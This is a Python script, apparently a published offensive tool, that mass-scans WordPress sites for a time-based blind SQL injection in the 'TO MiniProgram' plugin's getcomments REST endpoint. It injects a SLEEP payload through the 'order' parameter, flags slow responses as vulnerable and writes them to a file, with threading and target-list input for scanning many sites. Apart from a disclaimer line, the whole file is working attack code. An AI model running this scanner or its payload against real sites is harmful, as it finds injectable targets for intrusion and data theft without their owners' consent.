#!/usr/bin/env python3
import requests
import time
import urllib.parse
import argparse
from concurrent.futures import ThreadPoolExecutor
import os
from colorama import init, Fore, Style
# Test unique
# python3 scanner.py -u http://site.com -d 3

# Liste de sites
# python3 scanner.py -l targets.txt -t 10 -d 5


# Initialisation des couleurs
# init(autoreset=True)

# Configuration
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

def print_banner():
    """Affiche une bannière stylisée"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""{Fore.RED}
███████╗ ██████╗ ██╗          █████╗ ███╗   ██╗ █████╗ ██╗  ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║         ██╔══██╗████╗  ██║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
███████╗██║   ██║██║         ███████║██╔██╗ ██║███████║█████╔╝ █████╗  ██████╔╝
╚════██║██║   ██║██║         ██╔══██║██║╚██╗██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗    ██║  ██║██║ ╚████║██║  ██║██║  ██╗███████╗██║  ██║
╚══════╝ ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    print(banner)
    print(f"{Fore.YELLOW}TO MiniProgram SQLi Scanner {Fore.WHITE}| {Fore.CYAN}DETECTED WP")
    print(f"{Style.DIM}https://github.com/HackfutSec | For authorized security testing only\n")

def test_sqli(target_url, delay=5):
    """
    Teste une injection SQL time-based blind sur l'endpoint /getcomments
    """
    try:
        # Payload time-based (SLEEP)
        payload = f"DESC,(SELECT(1)FROM(SELECT(SLEEP({delay})))a)--"
        params = {
            "order": payload,
            "postid": "3",
            "limit": "1",
            "page": "1"
        }

        # Construction de l'URL
        endpoint = "/wp-json/watch-life-net/v1/comment/getcomments"
        url = urllib.parse.urljoin(target_url, endpoint)

        start_time = time.time()
        response = requests.get(url, params=params, headers=HEADERS, timeout=delay + 5)
        elapsed_time = time.time() - start_time

        if elapsed_time >= delay:
            return (True, f"{Fore.RED}[VULNERABLE] {Fore.WHITE}{target_url} - Response time: {Fore.YELLOW}{elapsed_time:.2f}s")
        else:
            return (False, f"{Fore.GREEN}[SAFE] {Fore.WHITE}{target_url} - Response time: {elapsed_time:.2f}s")

    except requests.exceptions.Timeout:
        return (False, f"{Fore.YELLOW}[TIMEOUT] {Fore.WHITE}{target_url} - Request timed out")
    except Exception as e:
        return (False, f"{Fore.YELLOW}[ERROR] {Fore.WHITE}{target_url} - {str(e)}")

def process_results(future):
    """Affiche les résultats avec formatage"""
    status, message = future.result()
    print(message)
    if status:  # Si vulnérable, écrire dans le fichier de résultats
        with open("vulnerable.txt", "a") as f:
            f.write(message.replace(Fore.RED, "").replace(Fore.WHITE, "").replace(Fore.YELLOW, "") + "\n")

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="Scanner de vulnérabilité SQLi pour TO MiniProgram")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL cible unique (ex: http://example.com)")
    group.add_argument("-l", "--list", help="Fichier contenant une liste d'URLs")
    parser.add_argument("-d", "--delay", type=int, default=5, 
                       help="Délai SLEEP en secondes (défaut: 5)")
    parser.add_argument("-t", "--threads", type=int, default=5,
                       help="Nombre de threads (défaut: 5)")
    args = parser.parse_args()

    targets = []
    if args.url:
        targets.append(args.url)
    else:
        try:
            with open(args.list, 'r') as f:
                targets.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Fichier non trouvé: {args.list}")
            return

    print(f"{Fore.CYAN}[*] Début du scan sur {Fore.WHITE}{len(targets)} cible(s)")
    print(f"{Fore.CYAN}[*] Paramètres: {Fore.WHITE}Threads={args.threads} | Delay={args.delay}s\n")

    # Effacer l'ancien fichier de résultats
    if os.path.exists("vulnerable.txt"):
        os.remove("vulnerable.txt")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(test_sqli, url, args.delay) for url in targets]
        for future in futures:
            future.add_done_callback(process_results)

    print(f"\n{Fore.GREEN}[+] Scan terminé")
    if os.path.exists("vulnerable.txt"):
        with open("vulnerable.txt", "r") as f:
            vuln_count = len(f.readlines())
        print(f"{Fore.RED}[!] {vuln_count} cibles vulnérables trouvées - voir {Fore.WHITE}vulnerable.txt")

if __name__ == "__main__":
    main()